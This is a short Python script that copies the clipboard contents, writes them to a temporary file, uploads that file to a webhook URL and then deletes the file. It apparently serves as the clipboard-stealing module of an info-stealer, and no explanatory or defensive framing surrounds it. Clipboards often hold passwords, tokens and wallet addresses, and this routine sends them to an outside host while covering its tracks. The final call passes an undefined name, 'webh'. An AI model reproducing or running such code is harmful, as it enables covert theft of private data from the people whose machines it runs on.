import pyperclip
import requests
import os

def clip(webhook):
    cliptext = pyperclip.paste()
    
    file = "clipboard.txt"
    with open(file, "w", encoding="utf-8") as f:
        f.write(cliptext)
    
    with open(file, "rb") as f:
        files = {
            "file": (file, f, "text/plain")
        }
        response = requests.post(webhook, files=files)
    
    os.remove(file)
    
    if response.status_code == 204:
        print("Clipboard sent!")
    else:
        print(f"Failed to send clipboard: {response.status_code}")
        print(response.text)

clip(webh)
